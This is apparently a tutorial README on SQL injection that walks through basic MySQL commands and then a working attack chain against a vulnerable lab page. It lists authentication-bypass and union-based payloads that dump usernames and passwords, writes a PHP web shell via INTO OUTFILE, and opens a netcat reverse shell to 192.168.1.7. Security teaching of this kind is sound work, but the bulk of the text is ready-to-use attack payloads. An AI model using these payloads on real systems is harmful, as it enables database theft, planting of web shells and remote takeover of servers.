# SQL-Injection
SQL injection is a code injection technique that might destroy your database.  SQL injection is one of the most common web hacking techniques.  SQL injection is the placement of malicious code in SQL statements, via web page input.

![picture](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRzqMMaSiLpc41gWmvmJrFHwTwTaOLS0mQOiw&usqp=CAU)

### Basic SQL

SQL is a standard language for storing, manipulating and retrieving data in databases.

1. Start mysql service and login. 

![Basic%20SQL%20170077aa75f74023baa74a4c0a66d934/Capture.png](Basic%20SQL%20170077aa75f74023baa74a4c0a66d934/Capture.png)

 2.  Create database name security. 

Syntax - create database Database_name;

Then use **show tables;** command to check tables exist in database.

![Basic%20SQL%20170077aa75f74023baa74a4c0a66d934/Capture%201.png](Basic%20SQL%20170077aa75f74023baa74a4c0a66d934/Capture%201.png)

 3.  Now create table user and add column to it.

Syntax - Create table table_name(Column_name1 data_type, Column_name2 datatype, ....);   

![Basic%20SQL%20170077aa75f74023baa74a4c0a66d934/Capture%202.png](Basic%20SQL%20170077aa75f74023baa74a4c0a66d934/Capture%202.png)

 4.  Insert values in table.

Syntax - Insert into table_name(Column_name1, Column_name2, ....) values (Value1, Value2, ....);

![Basic%20SQL%20170077aa75f74023baa74a4c0a66d934/Capture%203.png](Basic%20SQL%20170077aa75f74023baa74a4c0a66d934/Capture%203.png)

 5.  To select all data in table user

command - Select * from user;

![Basic%20SQL%20170077aa75f74023baa74a4c0a66d934/Capture%204.png](Basic%20SQL%20170077aa75f74023baa74a4c0a66d934/Capture%204.png)

 6.   To select database. use command - select database();

![Basic%20SQL%20170077aa75f74023baa74a4c0a66d934/Capture%205.png](Basic%20SQL%20170077aa75f74023baa74a4c0a66d934/Capture%205.png)

 7.  To see all username present in table user. 

command - select username from user;

![Basic%20SQL%20170077aa75f74023baa74a4c0a66d934/Capture%206.png](Basic%20SQL%20170077aa75f74023baa74a4c0a66d934/Capture%206.png)

 8.   Login query - **Select password from user where username = 'root';**

![Basic%20SQL%20170077aa75f74023baa74a4c0a66d934/Capture%207.png](Basic%20SQL%20170077aa75f74023baa74a4c0a66d934/Capture%207.png)



### SQL Injection Payload

Query - Select password from user where username='root';

1. payload - username='root  **' or '1' = '1**   ';

![SQL%20Injection%20Payload%20f46d7d2c2ac9439e8faaed0341ecec94/Capture.png](SQL%20Injection%20Payload%20f46d7d2c2ac9439e8faaed0341ecec94/Capture.png)

 2.  To select first password field. use payload - username='root   **' or '1' = '1' limit 1 #**      ';

![SQL%20Injection%20Payload%20f46d7d2c2ac9439e8faaed0341ecec94/Capture%201.png](SQL%20Injection%20Payload%20f46d7d2c2ac9439e8faaed0341ecec94/Capture%201.png)

 3.  To select first two password field. use payload - username='root    **' or '1' = '1' limit 0,2 #**     ';

![SQL%20Injection%20Payload%20f46d7d2c2ac9439e8faaed0341ecec94/Capture%202.png](SQL%20Injection%20Payload%20f46d7d2c2ac9439e8faaed0341ecec94/Capture%202.png)

4.  To select second password field only. Use payload - username='root   **' or '1' = '1' limit 1,1 #**    ';

![SQL%20Injection%20Payload%20f46d7d2c2ac9439e8faaed0341ecec94/Capture%203.png](SQL%20Injection%20Payload%20f46d7d2c2ac9439e8faaed0341ecec94/Capture%203.png)

5. For 3rd password field. use payload - username='root      **' or '1' = '1' limit 2,1 #**       ';

![SQL%20Injection%20Payload%20f46d7d2c2ac9439e8faaed0341ecec94/Capture%204.png](SQL%20Injection%20Payload%20f46d7d2c2ac9439e8faaed0341ecec94/Capture%204.png)


### Manual Error based SQL Injection

1. id=1

![Manual%20Error%20based%20SQL%20Injection%20f1dc8dabc2d44afeb963d336e8556235/Capture.png](Manual%20Error%20based%20SQL%20Injection%20f1dc8dabc2d44afeb963d336e8556235/Capture.png)

2. To check error-based sql exists. Type '.

Payload- **?id=1'**

![Manual%20Error%20based%20SQL%20Injection%20f1dc8dabc2d44afeb963d336e8556235/Capture%201.png](Manual%20Error%20based%20SQL%20Injection%20f1dc8dabc2d44afeb963d336e8556235/Capture%201.png)

3. Payload - **?id=' or 'a'='a**

![Manual%20Error%20based%20SQL%20Injection%20f1dc8dabc2d44afeb963d336e8556235/Capture%202.png](Manual%20Error%20based%20SQL%20Injection%20f1dc8dabc2d44afeb963d336e8556235/Capture%202.png)

4. Try to balance sql statement **?id=' --+**

![Manual%20Error%20based%20SQL%20Injection%20f1dc8dabc2d44afeb963d336e8556235/Capture%203.png](Manual%20Error%20based%20SQL%20Injection%20f1dc8dabc2d44afeb963d336e8556235/Capture%203.png)

5.  payload - **?id=' order by 1 --+**     To get no. of column. 

![Manual%20Error%20based%20SQL%20Injection%20f1dc8dabc2d44afeb963d336e8556235/Capture%204.png](Manual%20Error%20based%20SQL%20Injection%20f1dc8dabc2d44afeb963d336e8556235/Capture%204.png)

6. Increase column no. until got sql error.

payload - **?id=' order by 4 --+**

Here it gives Unknown column '4' in 'order clause' error it means there are 3 column exists.

![Manual%20Error%20based%20SQL%20Injection%20f1dc8dabc2d44afeb963d336e8556235/Capture%205.png](Manual%20Error%20based%20SQL%20Injection%20f1dc8dabc2d44afeb963d336e8556235/Capture%205.png)

7.  payload = **?id=' union select 1,2,3 --+   —>** for vulnerable column. Here 2,3 are reflected from database means 2nd and 3rd column is vulnerable to sql injection.

![Manual%20Error%20based%20SQL%20Injection%20f1dc8dabc2d44afeb963d336e8556235/Capture%206.png](Manual%20Error%20based%20SQL%20Injection%20f1dc8dabc2d44afeb963d336e8556235/Capture%206.png)

8. Database and version 

Payload - **?id=-99' union select 1,database(), version() --+**

![Manual%20Error%20based%20SQL%20Injection%20f1dc8dabc2d44afeb963d336e8556235/Capture%207.png](Manual%20Error%20based%20SQL%20Injection%20f1dc8dabc2d44afeb963d336e8556235/Capture%207.png)

     Database - security 

Version - 5.1.73

9. **select table_name from information_schema.tables;** - used to retrieve table from another database

![Manual%20Error%20based%20SQL%20Injection%20f1dc8dabc2d44afeb963d336e8556235/Capture%208.png](Manual%20Error%20based%20SQL%20Injection%20f1dc8dabc2d44afeb963d336e8556235/Capture%208.png)

10. **select table_name from information_schema.tables where table_schema=database(); -** To retrieve table from current database

![Manual%20Error%20based%20SQL%20Injection%20f1dc8dabc2d44afeb963d336e8556235/Capture%209.png](Manual%20Error%20based%20SQL%20Injection%20f1dc8dabc2d44afeb963d336e8556235/Capture%209.png)

11. Payload - **?id=-99' union select 1,2,table_name from information_schema.tables where table_schema=database() --+** 

![Manual%20Error%20based%20SQL%20Injection%20f1dc8dabc2d44afeb963d336e8556235/Capture%2010.png](Manual%20Error%20based%20SQL%20Injection%20f1dc8dabc2d44afeb963d336e8556235/Capture%2010.png)

12. use group_concat() to retrieve all tables

Payload - **?id=-99' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+**

![Manual%20Error%20based%20SQL%20Injection%20f1dc8dabc2d44afeb963d336e8556235/Capture%2011.png](Manual%20Error%20based%20SQL%20Injection%20f1dc8dabc2d44afeb963d336e8556235/Capture%2011.png)

13. To retrieve table in login field(2nd column).

Payload -

1) **?id=-99' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+**

2) **?id=-99' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 --+**

![Manual%20Error%20based%20SQL%20Injection%20f1dc8dabc2d44afeb963d336e8556235/Untitled.png](Manual%20Error%20based%20SQL%20Injection%20f1dc8dabc2d44afeb963d336e8556235/Untitled.png)

14. To retrieve column names.

Payload - **?id=-99' union select 1,group_concat(column_name),3 from information_schema.columns where table_name="users" --+**

![Manual%20Error%20based%20SQL%20Injection%20f1dc8dabc2d44afeb963d336e8556235/Untitled%201.png](Manual%20Error%20based%20SQL%20Injection%20f1dc8dabc2d44afeb963d336e8556235/Untitled%201.png)

15. To retrieve all usernames and password from table users

Payload - **?id=-99' union select 1,group_concat(username),group_concat(password) from users --+**

![Manual%20Error%20based%20SQL%20Injection%20f1dc8dabc2d44afeb963d336e8556235/Untitled%202.png](Manual%20Error%20based%20SQL%20Injection%20f1dc8dabc2d44afeb963d336e8556235/Untitled%202.png)


### SQL Injection to RCE (Remote Code Execution)

1. Retrieve data from table user.

![SQL%20Injection%20to%20RCE%20Remote%20Code%20Execution%208c2959730a1a4ca8966967ded111c688/Untitled.png](SQL%20Injection%20to%20RCE%20Remote%20Code%20Execution%208c2959730a1a4ca8966967ded111c688/Untitled.png)

2. To save result use command -  **select * from users into outfile "/tmp/sql_file";**

![SQL%20Injection%20to%20RCE%20Remote%20Code%20Execution%208c2959730a1a4ca8966967ded111c688/Untitled%201.png](SQL%20Injection%20to%20RCE%20Remote%20Code%20Execution%208c2959730a1a4ca8966967ded111c688/Untitled%201.png)

![SQL%20Injection%20to%20RCE%20Remote%20Code%20Execution%208c2959730a1a4ca8966967ded111c688/Untitled%202.png](SQL%20Injection%20to%20RCE%20Remote%20Code%20Execution%208c2959730a1a4ca8966967ded111c688/Untitled%202.png)

3. To save password in temp folder.

Payload- **?id=-99' union select 1,2,password from users into outfile "/tmp/cred" --+** 

![SQL%20Injection%20to%20RCE%20Remote%20Code%20Execution%208c2959730a1a4ca8966967ded111c688/Untitled%203.png](SQL%20Injection%20to%20RCE%20Remote%20Code%20Execution%208c2959730a1a4ca8966967ded111c688/Untitled%203.png)

![SQL%20Injection%20to%20RCE%20Remote%20Code%20Execution%208c2959730a1a4ca8966967ded111c688/Untitled%204.png](SQL%20Injection%20to%20RCE%20Remote%20Code%20Execution%208c2959730a1a4ca8966967ded111c688/Untitled%204.png)

       Payload -  **?id=-99' union select 1,2,"Awesome" into outfile "/tmp/cred1" --+**

![SQL%20Injection%20to%20RCE%20Remote%20Code%20Execution%208c2959730a1a4ca8966967ded111c688/Untitled%205.png](SQL%20Injection%20to%20RCE%20Remote%20Code%20Execution%208c2959730a1a4ca8966967ded111c688/Untitled%205.png)

![SQL%20Injection%20to%20RCE%20Remote%20Code%20Execution%208c2959730a1a4ca8966967ded111c688/Untitled%206.png](SQL%20Injection%20to%20RCE%20Remote%20Code%20Execution%208c2959730a1a4ca8966967ded111c688/Untitled%206.png)

#### 4. **RCE Payload**

Payload- **?id=-99' union select 1,2,"<?php echo system($_GET['cmd']) ?>" into outfile "/var/www/html/write/shell.php" --+**

![SQL%20Injection%20to%20RCE%20Remote%20Code%20Execution%208c2959730a1a4ca8966967ded111c688/Untitled%207.png](SQL%20Injection%20to%20RCE%20Remote%20Code%20Execution%208c2959730a1a4ca8966967ded111c688/Untitled%207.png)

![SQL%20Injection%20to%20RCE%20Remote%20Code%20Execution%208c2959730a1a4ca8966967ded111c688/Untitled%208.png](SQL%20Injection%20to%20RCE%20Remote%20Code%20Execution%208c2959730a1a4ca8966967ded111c688/Untitled%208.png)

![SQL%20Injection%20to%20RCE%20Remote%20Code%20Execution%208c2959730a1a4ca8966967ded111c688/Untitled%209.png](SQL%20Injection%20to%20RCE%20Remote%20Code%20Execution%208c2959730a1a4ca8966967ded111c688/Untitled%209.png)


### RCE to Reverse shell

a. Start listening on port using nc command  **nc -nlvp 6001**

![RCE%20to%20Reverse%20shell%20a7a9c227a7ed4d0e8895ff3315089f6b/Untitled.png](RCE%20to%20Reverse%20shell%20a7a9c227a7ed4d0e8895ff3315089f6b/Untitled.png)

b. use command **nc -e /bin/bash 192.168.1.7 6001 to take reverse shell.**

![RCE%20to%20Reverse%20shell%20a7a9c227a7ed4d0e8895ff3315089f6b/Untitled%201.png](RCE%20to%20Reverse%20shell%20a7a9c227a7ed4d0e8895ff3315089f6b/Untitled%201.png)

![RCE%20to%20Reverse%20shell%20a7a9c227a7ed4d0e8895ff3315089f6b/Untitled%202.png](RCE%20to%20Reverse%20shell%20a7a9c227a7ed4d0e8895ff3315089f6b/Untitled%202.png)
